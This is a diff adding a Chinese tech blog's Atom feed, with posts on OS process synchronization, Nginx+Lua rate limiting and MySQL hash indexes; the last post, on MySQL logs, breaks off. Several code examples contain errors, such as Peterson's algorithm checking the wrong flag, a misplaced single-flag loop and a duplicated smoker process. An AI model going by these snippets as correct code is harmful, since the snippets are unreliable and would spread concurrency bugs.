@@ -1,0 +1,2895 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>夏日小草</title>
+  <subtitle>念念不忘 必有回响</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="https://homeway.me/"/>
+  <updated>2017-02-26T15:26:40.000Z</updated>
+  <id>https://homeway.me/</id>
+  
+  <author>
+    <name>grasses</name>
+    <email>xiaocao.grasses{at}gmail.com</email>
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Userstand OS - Process</title>
+    <link href="https://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/"/>
+    <id>https://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/</id>
+    <published>2017-01-12T16:24:10.000Z</published>
+    <updated>2017-02-26T15:26:40.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/2017-01-13-understand-os-process-mutex-and-synchronization-deadlock.jpg" alt="OS Process"></p>
+<a id="more"></a>
+<p>虽然进程可以共享系统资源，但是许多资源在同一时刻只能被一个进程共享，一次只允许一个进程共享的资源就是临界资源。临界资源的访问过程有四个部分：进入区、临界区、退出区、剩余区。</p>
+<pre><code>do {
+    entry section;
+    critical section;
+    exit section;
+    remainder section;
+} while(true);
+</code></pre><p>进程同步要求进程之间通过信号量进行等待、传递信息产生制约关系；进程互斥要求进程间遵守：空闲让进、忙则等待、有限等待、让权等待。让权等待是指当进程不能进入临界区时，应立即释放处理器防止进程忙等待。</p>
+<p><br></p>
+<h1 id="0x01-同步与互斥原型"><a href="#0x01-同步与互斥原型" class="headerlink" title="0x01.同步与互斥原型"></a>0x01.同步与互斥原型</h1><p>临界区的实现主要有硬件和软件方法。<br>硬件实现的一个方法是中断屏蔽法，主要通过<code>关中断=&gt;临界区=&gt;开中断实现</code>，由于CPU只有在中断中才能进行进程调度，所以屏蔽中断可以将进程内代码顺利执行完毕；而硬件方法还有另外一种TestAndSet硬件指令法。由于TestAndSet是原子操作不可再分割，从而保证了指令能在顺利执行完毕，功能如下：</p>
+<pre><code>bool TestAndSet(boolean *lock) {
+    boolean old;
+    old = *lock;
+    *lock = true;
+    return old;
+}
+</code></pre><p>软件屏蔽有几种方法：</p>
+<h3 id="1-单标志法"><a href="#1-单标志法" class="headerlink" title="1.单标志法"></a>1.单标志法</h3><pre><code>Process1() {                        Process2() {
+    while(turn != 0) {                    while(turn != 1) {
+        critical section;                    critical section;
+        turn = 1;                            turn = 0;
+        remainder section;                    remainder section;
+    }                                    }
+}                                    }
+</code></pre><p>如果两个进程交替进入临界区，该算法能保证每次只允许一个进程进入临界区，但是当一个进程长期不再进入临界区，另一个进程就无法再进入临界区，从而违背了“空闲让进”。</p>
+<h3 id="2-双标志先检查法"><a href="#2-双标志先检查法" class="headerlink" title="2.双标志先检查法"></a>2.双标志先检查法</h3><pre><code>Process1() {                        Process2() {
+    while(flag[2]) {}                    while(flag[1]) {}
+    flag[1] = true;                        flag[2] = true;
+    critical section;                    critical section;
+    flag[1] = false;                       flag[2] = false;
+    remainder section;                    remainder section;
+}                                    }
+</code></pre><p>算法的基本思想是在每个进程访问临界区之前查看下对方是否在访问临界区，若正在访问则需要等待，否则进程进入临界区并设置临界区访问标志。双标志可以不用交替进入临界区运行，但是P1()和P2()在1时刻同时进入 <code>while(flag[]) {}</code> 可能会出现P1()和P2()同时进入临界区，违背忙则等待。</p>
+<h3 id="3-双标志后检查"><a href="#3-双标志后检查" class="headerlink" title="3.双标志后检查"></a>3.双标志后检查</h3><pre><code>process1() {                        process2() {
+    flag[1] = true;                            flag[2] = true;
+    while(flag[2]) {}                        while(flag[1]) {}
+    critical section;                        critical section;
+    flag[1] = false;                            flag[2] = false;
+    remainder section;                        remainder section;
+}                                    }
+</code></pre><p>双标志后检查是对双标志法的改进，为了防止进程同时进入临界区，采用先置标志法 <code>flag[i] = true;</code> 保证了临界资源的互斥性。但是当两个进程P1()和P2()都想进入临界区同时置标志，会导致进程相互谦让都无法进入临界区，从而导致了”饥饿”。</p>
+<h3 id="4-Peterson算法"><a href="#4-Peterson算法" class="headerlink" title="4.Peterson算法"></a>4.Peterson算法</h3><p>就在问题无法解决时候，Peterson提出了Peterson算法，既能保证符合进程同步与互斥条件又不会产生及饥饿。为了防止两个进程无尽等待，Peterson设置了turn标志，每个进程先置自己标志后再设置turn标志。那么Peterson算法究竟是什么样的呢？</p>
+<pre><code>process1() {                                process2() {
+    flag[1] = true;                           flag[2] = true;
+    turn = 2;                                 turn = 1;
+    while(flag[2] &amp;&amp; turn == 2){}            while(flag[2]  &amp;&amp; turn == 1){}
+    critical section;                        critical section;
+    flag[1] = false;                         flag[2] = false;
+    remainder section;                        remainder section;
+}                                            }
+</code></pre><h1 id="0x02-经典同步与互斥事件"><a href="#0x02-经典同步与互斥事件" class="headerlink" title="0x02.经典同步与互斥事件"></a>0x02.经典同步与互斥事件</h1><h3 id="生产者与消费者"><a href="#生产者与消费者" class="headerlink" title="生产者与消费者"></a>生产者与消费者</h3><p><img src="http://xiaocao.u.qiniudn.com/2017-01-13-understand-os-process-mutex-and-synchronization-producer-consumer-buffer.jpg" alt="Producer &amp;&amp; Consumer"><br>常见问题：生产者、消费者共享一组初始为空，大小为n的缓冲区空间，只有缓冲区不满的时候，生产者才能把消息放入缓冲区，否则必须等待；只有缓冲区不空的时候，消费者才能从缓冲区取出消息；并且放入与取出必须互斥操作。</p>
+<p>缓冲区操作必须互斥，因此在对缓冲区操作前要加锁 <code>P(mutex);</code> 执行完后释放锁 <code>V(mutex);</code> 缓冲区操作满和不满需要进程间同步通信通知，empty 和 full 用于进程间同步，当缓冲区有消息时执行 <code>V(full);</code> 唤醒Consumer()，当缓冲区有空位时，执行 <code>V(empty);</code> 唤醒Producer()。</p>
+<pre><code>semaphore mutex = 1;
+semaphore full = 0;
+semaphore empty = n;
+
+Process Producer() {
+    while(True) {
+        P(empty);
+        P(mutex);    //互斥操作资源加锁P(mutex);
+        //produce...
+        V(mutex);    //互斥操作释放资源V(mutex);
+        V(full);    //进程同步通知Consumer()生产完毕
+    }
+}
+Process Consumer() {
+    while(True) {
+        P(full);
+        P(mutex);    //互斥操作资源加锁P(mutex);
+        //consume...
+        V(mutex);    //互斥操作释放资源V(mutex);
+        V(empty);    //进程同步通知Producer()消费完毕
+    }    
+}
+</code></pre><h3 id="读写者问题"><a href="#读写者问题" class="headerlink" title="读写者问题"></a>读写者问题</h3><p>常见问题：系统文件读写，有读者和写者两个并发进程共享一个文件，当多个进程共同读取文件时不会发生问题，但读者和写者、写者和写者不能同时作用于共享文件。总结：允许多个读者读文件；一次仅一个写者写文件；写者完成之前不允许读者和写者操作文件；写者执行写之前应等待读者、写者退出。</p>
+<p>保证不对读者做限制，必须要对写者加锁，而何时加锁呢？需要根据读者数量做判断，当读者读以前数量为0时候，需要对写者加锁，当读者退出时候发现读者数为0，则需要释放写者锁。对于读者对 <code>count</code> 以及 <code>mutex</code> 锁的操作，需要加 <code>P(mutex);</code> 读者互斥锁。由上面分析可知写者处于弱势，优先权低，为了解决这个问题，引入 <code>write_first</code> 保证读者和写者公平竞争。</p>
+<pre><code>int count = 0;                //记录读者数
+semaphore mutex = 1;        //对count、write锁操作互斥
+semaphore write = 1;        //写进程
+semaphore write_first = 1;    //写优先
+Process Writer() {
+    while(True) {
+        P(write_first);    //读者优先
+        P(write);            //读写者互斥
+        //writing...
+        V(write);
+        V(write_first);
+    }
+}
+Process Reader() {
+    while(True) {
+        P(write_first);    //读者优先
+        P(mutex);            //对count、write锁操作互斥
+        if(count == 0) P(write);    //读者只有一个，对写者上锁
+        count++;                        //读者数+1
+        V(mutex);
+        V(write_first);
+        //reading...
+        P(write_first);
+        P(mutex);        //对count、write锁操作互斥
+        count--;        //读者数-1
+        if(count == 0) V(write);    //读者只有一个，对写者解锁
+        V(mutex);
+        V(write_first);
+    }
+}
+</code></pre><h3 id="双向读写者问题"><a href="#双向读写者问题" class="headerlink" title="双向读写者问题"></a>双向读写者问题</h3><p><img src="http://xiaocao.u.qiniudn.com/blog/2017-01-13-understand-os-process-mutex-and-synchronization-bridge_crossing.jpg" alt="Crossing the bridge"></p>
+<p>常见问题：单向通行的桥，不允许双向交汇但允许同向而行并且显示单向一次最多 <code>max_size</code> 通行量。这个问题由读写者引申而来，读者 &amp;&amp; 写者都必须互斥操作，并且限制了同时操作数量。作为对称处理，需要同时对东向、西向进程设立锁，并且记录当前用户数以方便为对方设置锁。</p>
+<pre><code>int east_count = 0;
+int west_count = 0;
+semaphore meast = 1;    //互斥操作east数据
+semaphore mwest = 1;    //互斥操作west数据
+semaphore mutex = 1;    //east与west只允许一方向
+semaphore max_size = n;//单方向最大通行量
+
+Process east(int i) {
+    P(meast);            //互斥操作east数据
+    if(east_count == 0) P(mutex);    //对于第一次获得锁方向
+    east_count++;
+    V(meast);
+    P(max_size);        //单方向最大通行量同步
+    //acrossing the bridge
+    V(max_size);
+    P(meast);
+    east_count--;
+    if(east_count == 0) V(mutex);    //对于最后一次占用锁
+    V(meast);
+}
+Process west(int i) {
+    P(mwest);            //互斥操作east数据
+    if(west_count == 0) P(mutex);    //对于第一次获得锁方向
+    west_count++;
+    V(mwest);
+    P(max_size);    //单方向最大通行量同步
+    //acrossing the bridge
+    V(max_size);
+    P(mwest);
+    west_count--;
+    if(west_count == 0) V(mutex);    //对于最后一次占用锁
+    V(mwest);
+}
+</code></pre><h3 id="哲学家就餐问题"><a href="#哲学家就餐问题" class="headerlink" title="哲学家就餐问题"></a>哲学家就餐问题</h3><p><img src="http://xiaocao.u.qiniudn.com/blog/2017-01-13-understand-os-process-mutex-and-synchronization-philosopher-dining.jpg" alt="Philosopher dining"><br>常见问题：一张桌子上有5个哲学家，每两个哲学家中间放一根筷子，哲学家只有两件事：吃饭、思考。如果哲学家拿到左右手两根筷子就吃饭，进餐完毕后保持思考，如果一根筷子在旁边哲学家手里，只能等待。</p>
+<p>试想，当哲学家都同时拿起左手边的筷子，等到他们想拿右手边的筷子却已被拿走，系统进入死锁。如何让一个哲学家拿到左右两根筷子而不造成死锁或者饥饿现象？(1)让他们同时拿左右两根筷子(2)对每个哲学家动作做规定，当哲学家抢占到抢筷子是加互斥锁，阻止其他哲学家抢占筷子。</p>
+<pre><code>semaphore mutex = 1;
+semaphore chopsticks[5] = {1, 1, 1, 1, 1};//筷子序号
+Process P(int i) {    //哲学家ID=0,1,2,3,4
+    do {
+        P(mutex);    //保证仅有一个抢占，防止死锁
+        P(chopsticks[i]);    //获取左手筷子
+        P(chopsticks[(i + 1) % 5]);    //获取右手筷子
+        V(mutex);
+        //eating...
+        V(chopsticks[i]);    //释放左手筷子
+        V(chopsticks[(i + 1) % 5]);    //释放右手筷子
+        //thinking...
+    } while(True);
+}
+</code></pre><h3 id="吸烟者问题"><a href="#吸烟者问题" class="headerlink" title="吸烟者问题"></a>吸烟者问题</h3><p>常见问题：有3个吸烟者，A有纸张+烟草，B有纸张+胶水，C有烟草+胶水，当且仅当他们拥有纸张+烟草+胶水才能制作香烟吸烟。进程提供者无限随机提供三种物品中的一种，仅当吸烟者吸完烟，供应者受到信号才提供资源。</p>
+<p>供应者与吸烟者是同步关系，由于供应者无法同时提供资源，供应者提供资源是一个互斥操作。</p>
+<pre><code>int random;                //随机数
+semaphore finish = 0;        //抽烟结束同步信号
+semaphore resource1 = 0;    //纸张+烟草
+semaphore resource2 = 0;    //纸张+胶水
+semaphore resource3 = 0;    //烟草+胶水
+Process Offer() {            //资源提供者
+    while(True) {
+        random = rand();    //获取随机数
+        if(random % 3 == 0) //根据随机数提供资源
+            V(resource1);
+        else if(random % 3 == 1) 
+            V(resource2);
+        else if(random % 3 == 2) 
+            V(resource3);
+        //offering...
+        P(finish);
+    }
+}
+Process User1() {        //有烟草
+    while(True) {
+        P(resource2);    //等待纸张+胶水
+        //smoking...
+        V(finish);
+    }
+}
+Process User2() {        //有纸张
+    while(True) {
+        P(resource3);    //等待烟草+胶水
+        //smoking...
+        V(finish);
+    }
+}
+Process User1() {        //有胶水
+    while(True) {
+        P(resource1);    //等待纸张+烟草
+        //smoking...
+        V(finish);
+    }
+}
+</code></pre><p><br></p>
+<hr>
+
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-01-13-understand-os-process-mutex-and-synchronization"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2017-01-13-understand-os-process-mutex-and-synchronization" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/">http://homeway.me/2017/01/13/understand-os-process-mutex-and-synchronization/</a></h4><p>-Grasses</p>
+<p>2017-01-13</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://xiaocao.u.qiniudn.com/blog/2017-01-13-understand-os-process-mutex-and-synchronization-deadlock.jpg&quot; alt=&quot;OS Process&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="OS" scheme="https://homeway.me/tags/OS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Nginx流量拦截算法</title>
+    <link href="https://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm/"/>
+    <id>https://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm/</id>
+    <published>2015-10-21T11:39:10.000Z</published>
+    <updated>2016-12-29T16:21:22.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx-lua.png" alt="nginx-lua-static-merger"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x00-About"><a href="#0x00-About" class="headerlink" title="0x00.About"></a>0x00.About</h1><p>电商平台营销时候，经常会碰到的大流量问题，除了做流量分流处理，可能还要做用户黑白名单、信誉分析，进而根据用户ip信誉权重做相应的流量拦截、限制流量。</p>
+<p>Nginx自身有的请求限制模块<a href="http://nginx.org/en/docs/http/ngx_http_limit_req_module.html" target="_blank" rel="external">ngx_http_limit_req_module</a>、流量限制模块<a href="http://nginx.org/en/docs/stream/ngx_stream_limit_conn_module.html" target="_blank" rel="external">ngx_stream_limit_conn_module</a>基于令牌桶算法，可以方便的控制令牌速率，自定义调节限流，就能很好的限制请求数量，然而，nginx.conf问题还是在于无法热加载。</p>
+<p>之前做过的流量限制方案，《<a href="http://homeway.me/2015/08/11/nginx-lua-redis-access-control/">Nginx+Lua+Redis访问频率控制</a>》，原理是动态的基于ip，实现简单的漏桶算法，限制访问频率。</p>
+<p>这里的话，就简单分析下流量限制算法：漏桶算法、令牌桶算法、滑动窗口等在Nginx+Lua中如何动态绑定uri，动态设定rate实现。</p>
+<p><hr><br></p>
+<h1 id="0x01-Leaky-Bucket-Algorithm"><a href="#0x01-Leaky-Bucket-Algorithm" class="headerlink" title="0x01.Leaky Bucket Algorithm"></a>0x01.Leaky Bucket Algorithm</h1><p>漏桶算法可以很好地限制容量池的大小，从而防止流量暴增。如果针对uri+ip作为监测的key，就可以实现定向的设定指定ip对指定uri容量大小，超出的请求做队列处理（队列处理要引入消息机制）或者丢弃处理。这也是v2ex对流量拦截的算法，针对uri+ip做流量监测。</p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/2015-10-21-nginx-lua-traffic-limit-algorithm-leaky-bucket.png" alt="Leaky Bucket Algorithm"></p>
+<p>漏桶算法实现上来说，就是建立一个队列，在Redis中以uri:ip作为key，队列上实现FIFO，在请求的前奏实现插入，请求完成后实现删除。</p>
+<p>实现方法是在Nginx发送http数据给用户后，通过<code>ngx.eof()</code>关闭TCP协议，做其他操作，可以参见<a href="http://wiki.jikexueyuan.com/project/openresty-best-practice/continue-after-eof.html" target="_blank" rel="external">请求返回后继续执行</a>。</p>
+<p>下面是部分代码：</p>
+<pre><code>local _M = { _VERSION = &quot;2015.10.19&quot;, OK = 1, BUSY = 2, FORBIDDEN = 3 }
+
+function _M.do_list(red, uri, key, size, rate)
+    local ok, err = red:expire(uri .. &quot;:&quot; .. key, size)
+    if not ok then
+        ngx.log(ngx.WARN, &quot;redis set expire error: &quot;, err)
+        return nil
+    end
+    local ok, err = red:rpush(uri .. &quot;:&quot; .. key, ngx.time())
+    if not ok then
+        ngx.log(ngx.WARN, &quot;redis rpush error: &quot;, err)
+        return nil
+    end
+    local res, err = red:lrange(uri .. &quot;:&quot; .. key, -(size * rate), -1)
+    if not ok then
+        ngx.log(ngx.WARN, &quot;redis lrange error: &quot;, err)
+        return nil
+    end
+    if #res &lt; (size * rate) or res[#res] - res[1] &lt; size then
+        return _M.OK
+    end
+    return nil
+end
+</code></pre><p>漏桶算法优点很明显，简单、高效，能恰当拦截容量外的暴力流量。</p>
+<p>但缺点也明显，无法对流量做频率处理，比如桶size大小设置范围内，进行并发攻击依然能大流量并发效果，桶容量不可以过小，否则容易卡死正常用户。</p>
+<h1 id="0x02-Token-Bucket-Algorithm"><a href="#0x02-Token-Bucket-Algorithm" class="headerlink" title="0x02.Token Bucket Algorithm"></a>0x02.Token Bucket Algorithm</h1><p>令牌桶算法通过发放令牌，根据令牌的rate频率做请求频率限制，容量限制等。</p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/2015-10-21-nginx-lua-traffic-limit-algorithm-token-bucket-lgorithm.jpg" alt="Token Bucket Algorithm"></p>
+<ul>
+<li><p>系统根据rate(r/s)频率参数向指定桶中添加token，满则保持，不添加</p>
+</li>
+<li><p>当用户请求Nginx时候，分析uri是否需要限制流量，限制则执行令牌桶算法</p>
+</li>
+<li><p>如果桶满了，则请求通过，消耗令牌一枚；如果请求Redis发现key不存在，则通过size装满令牌桶；如果桶内令牌空，则废弃或等待流量。</p>
+</li>
+</ul>
+<p>Nginx + Lua 模型中实现必然不能跑一个程序添加令牌了，这个时候需要在分析令牌时候，通过计算时间间隔一次性添加完令牌桶内令牌。具体算法是：rate * time_distance = token_count令牌数量， if token_count &gt; size 桶容量， token_count = size。</p>
+<p>实现的存储结构是用Hash哈希存储 uri:ip -&gt; token_count，字段通过EXPIRE设定过期时间，达到长时间不访问清除桶数据效果。</p>
+<p>桶的大小、请求的频率限制用Redis哈希表存储，不存在则默认不做流量拦截。</p>
+<p>用户黑白名单通过Order SET设定信誉权重，权重越大，代表危险性越大，进而通过百分比改变接口限定rate频率。</p>
+<p>令牌桶算法优势在于能针对uri做定向rate、size等，不仅限制总请求大小，还限制平均频率大小。缺点是，还是容易导致误判等问题，并切用户的信誉无法完全准确。</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>1.<a href="https://en.wikipedia.org/wiki/Token_bucket" target="_blank" rel="external">Token Bucket Algorithm</a></p>
+<p>2.<a href="https://en.wikipedia.org/wiki/Leaky_bucket" target="_blank" rel="external">Token Bucket Algorithm</a></p>
+<p>3.<a href="http://www.cnblogs.com/zhengyun_ustc/archive/2012/11/17/topic1.html" target="_blank" rel="external">电商课题I：集群环境下业务限流</a></p>
+<p><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-10-21-nginx-lua-traffic-limit-algorithm"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-10-21-nginx-lua-traffic-limit-algorithm" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm">http://homeway.me/2015/10/21/nginx-lua-traffic-limit-algorithm</a></h4><p>-by小草</p>
+<p>2015-10-21 21:49:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://77l5jp.com1.z0.glb.clouddn.com/blog/logo-nginx-lua.png&quot; alt=&quot;nginx-lua-static-merger&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Nginx" scheme="https://homeway.me/tags/Nginx/"/>
+    
+      <category term="Lua" scheme="https://homeway.me/tags/Lua/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MySQL索引之哈希索引</title>
+    <link href="https://homeway.me/2015/09/13/mysql-hash-index/"/>
+    <id>https://homeway.me/2015/09/13/mysql-hash-index/</id>
+    <published>2015-09-13T07:44:10.000Z</published>
+    <updated>2015-09-13T08:24:57.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/logo-mysql.png" alt="mysql-log"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x00-About"><a href="#0x00-About" class="headerlink" title="0x00.About"></a>0x00.About</h1><p>索引（Index）是帮助MySQL高效获取数据的数据结构。提取句子主干，就可以得到索引的本质：索引是数据结构。</p>
+<p>从MySQL逻辑架构来看，MySQL有三层架构，第一层连接，第二层查询解析、分析、优化、视图、缓存，第三层，存储引擎。</p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/2015-09-13-mysql-hash-index-mysql-design.png" alt="MySQL逻辑架构"></p>
+<p>索引通过分开查询片，节省了扫描查找时间，大大提升查询效率。</p>
+<p>大部分数据库系统及文件系统都采用B-Tree或其变种B+Tree作为索引结构。</p>
+<p>索引主要在存储引擎层上，不同的引擎也就有不同的B-Tree算法。</p>
+<p><br><hr></p>
+<h1 id="0x01-Hash-Index"><a href="#0x01-Hash-Index" class="headerlink" title="0x01.Hash Index"></a>0x01.Hash Index</h1><p>哈希索引只有Memory, NDB两种引擎支持，Memory引擎默认支持哈希索引，如果多个hash值相同，出现哈希碰撞，那么索引以链表方式存储。</p>
+<p>但是，Memory引擎表只对能够适合机器的内存切实有限的数据集。</p>
+<p>要使InnoDB或MyISAM支持哈希索引，可以通过伪哈希索引来实现，叫自适应哈希索引。</p>
+<p>主要通过增加一个字段，存储hash值，将hash值建立索引，在插入和更新的时候，建立触发器，自动添加计算后的hash到表里。</p>
+<h2 id="直接索引"><a href="#直接索引" class="headerlink" title="直接索引"></a>直接索引</h2><p>假如有一个非常非常大的表，如下：</p>
+<pre><code>CREATE TABLE IF NOT EXISTS `User` (
+  `id` int(10) NOT NULL COMMENT &#39;自增id&#39;,
+  `name` varchar(128) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;用户名&#39;,
+  `email` varchar(128) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;用户邮箱&#39;,
+  `pass` varchar(64) NOT NULL DEFAULT &#39;&#39; COMMENT &#39;用户密码&#39;,
+  `last` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#39;最后登录时间&#39;,
+) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;
+</code></pre><p>这个时候，比如说，用户登陆，我需要通过email检索出用户，通过explain得到如下：</p>
+<blockquote>
+<p>mysql&gt; explain SELECT <code>id</code> FROM <code>User</code> WHERE email = ‘ooxx@gmail.com’ LIMIT 1;</p>
+</blockquote>
+<pre><code>+----+-------------+-------+------+---------------+------+---------+------+--------+-------------+
+| id | select_type | table | type | possible_keys | key  | key_len | ref  | rows   | Extra       |
++----+-------------+-------+------+---------------+------+---------+------+--------+-------------+
+|  1 | SIMPLE      | User  | ALL  | NULL          | NULL | NULL    | NULL | 384742 | Using where |
++----+-------------+-------+------+---------------+------+---------+------+--------+-------------+
+</code></pre><p>发现 <code>rows = 384742</code> 也就是要在384742里面进行比对email这个字段的字符串。</p>
+<p>这条记录运行的时间是：Query took 0.1744 seconds，数据库的大小是40万。</p>
+<p>从上面可以说明，如果直接在email上面建立索引，除了索引区间匹配，还要进行字符串匹配比对，email短还好，如果长的话这个查询代价就比较大。</p>
+<p>如果这个时候，在email上建立哈希索引，查询以int查询，性能就比字符串比对查询快多了。</p>
+<h2 id="Hash-算法"><a href="#Hash-算法" class="headerlink" title="Hash 算法"></a>Hash 算法</h2><p>建立哈希索引，先选定哈希算法，这里选用CRC32。</p>
+<p>《高性能MySQL》说到的方法CRC32算法，建立SHA或MD5算法是划算的，本身位数都有可能比email段长了。</p>
+<h2 id="INSERT-UPDATE-SELECT-操作"><a href="#INSERT-UPDATE-SELECT-操作" class="headerlink" title="INSERT UPDATE SELECT 操作"></a>INSERT UPDATE SELECT 操作</h2><p>在表中添加hash值的字段：</p>
+<blockquote>
+<p>mysql&gt; ALTER TABLE <code>User</code> ADD COLUMN email_hash int unsigned NOT NULL DEFAULT 0;</p>
+</blockquote>
+<p>接下来就是在UPDATE和INSERT的时候，自动更新 <code>email_hash</code> 字段，通过MySQL触发器实现：</p>
+<pre><code>DELIMITER |
+CREATE TRIGGER user_hash_insert BEFORE INSERT ON `User` FOR EACH ROW BEGIN
+SET NEW.email_hash=crc32(NEW.email);
+END;
+|
+CREATE TRIGGER user_hash_update BEFORE UPDATE ON `User` FOR EACH ROW BEGIN
+SET NEW.email_hash=crc32(NEW.email);
+END;
+|
+DELIMITER ;
+</code></pre><p>这样的话，我们的SELECT请求就会变成这样：</p>
+<blockquote>
+<p>mysql&gt; SELECT <code>email</code>, <code>email_hash</code> FROM <code>User</code> WHERE email_hash = CRC32(“F2dgTSWRBXSZ1d3O@gmail.com”) AND <code>email</code> = “F2dgTSWRBXSZ1d3O@gmail.com”;</p>
+</blockquote>
+<pre><code>+----------------------------+------------+
+| email                      | email_hash |
++----------------------------+------------+
+| F2dgTSWRBXSZ1d3O@gmail.com | 2765311122 |
++----------------------------+------------+
+</code></pre><p>在没建立hash索引时候，请求时间是 0.2374 seconds，建立完索引后，请求时间直接变成 0.0003 seconds。</p>
+<p><code>AND email = &quot;F2dgTSWRBXSZ1d3O@gmail.com&quot;</code> 是为了防止哈希碰撞导致数据不准确。</p>
+<p><br><hr></p>
+<h1 id="0x02-Hash-Index-缺点"><a href="#0x02-Hash-Index-缺点" class="headerlink" title="0x02.Hash Index 缺点"></a>0x02.Hash Index 缺点</h1><p>哈希索引也有几个缺点：</p>
+<ul>
+<li>索引存放的是hash值,所以仅支持 &lt; = &gt; 以及 IN 操作</li>
+<li>hash索引无法通过操作索引来排序，因为存放的时候经过hash计算，但是计算的hash值和存放的不一定相等，所以无法排序</li>
+<li>不能避免全表扫描，只是由于在memory表里支持非唯一值hash索引，就是不同的索引键，可能存在相同的hash值</li>
+<li>如果哈希碰撞很多的话，性能也会变得很差</li>
+<li>哈希索引无法被用来避免数据的排序操作</li>
+</ul>
+<p><br><hr></p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p>[1] Baron Scbwartz等 著，王小东等 译；<a href="http://www.amazon.cn/%E9%AB%98%E6%80%A7%E8%83%BDMySQL-%E6%96%BD%E7%93%A6%E8%8C%A8/dp/B00C1W58DE" target="_blank" rel="external">高性能MySQL（High Performance MySQL）</a>；电子工业出版社，2010</p>
+<p>[2] <a href="http://www.searchdatabase.com.cn/showcontent_39678.htm" target="_blank" rel="external">《MySQL的B-Tree索引和Hash索引的区别》</a></p>
+<p>[3] <a href="http://itindex.net/detail/51924-mysql-%E7%B4%A2%E5%BC%95-%E4%BC%98%E5%8C%96" target="_blank" rel="external">《mysql 索引优化 btree hash rtree》</a></p>
+<p><br></p>
+<h4 id="本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-13-mysql-hash-index"><a href="#本文出自-夏日小草-转载请注明出处-http-homeway-me-2015-09-13-mysql-hash-index" class="headerlink" title="本文出自 夏日小草,转载请注明出处:http://homeway.me/2015/09/13/mysql-hash-index"></a>本文出自 <a href="http://homeway.me">夏日小草</a>,转载请注明出处:<a href="http://homeway.me/2015/09/13/mysql-hash-index">http://homeway.me/2015/09/13/mysql-hash-index</a></h4><p>-by小草</p>
+<p>2015-09-13 15:49:10</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;br&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://xiaocao.u.qiniudn.com/blog/logo-mysql.png&quot; alt=&quot;mysql-log&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="Tech" scheme="https://homeway.me/categories/Tech/"/>
+    
+    
+      <category term="Mysql" scheme="https://homeway.me/tags/Mysql/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MySQL日志分析</title>
+    <link href="https://homeway.me/2015/09/12/mysql-log/"/>
+    <id>https://homeway.me/2015/09/12/mysql-log/</id>
+    <published>2015-09-11T17:44:10.000Z</published>
+    <updated>2015-09-13T06:55:54.000Z</updated>
+    
+    <content type="html"><![CDATA[<p><br></p>
+<p><img src="http://xiaocao.u.qiniudn.com/blog/logo-mysql.png" alt="mysql-log"></p>
+<a id="more"></a>
+<p><br></p>
+<h1 id="0x01-About"><a href="#0x01-About" class="headerlink" title="0x01.About"></a>0x01.About</h1><p>MySQL有四种类型的日志：Error Log、General Query Log、Binary Log 和 Slow Query Log。</p>
+<p>第一种错误日志，记录MySQL运行过程ERROR,WARNING,NOTE等信息，系统出错或者某条记录出问题可以查看ERROR日志。</p>
+<p>第二种日常运行日志，记录MySQL运行中的每条请求数据。</p>
+<p>第三种二进制日志，包含了一些事件，这些事件描述了数据库的改动，如建表、数据改动等，也包括一些潜在改动，主要用于备份恢复、回滚等操作。</p>
+<p>第四种慢查询日志，用于MySQL性能调优。</p>
+<p><br><hr></p>
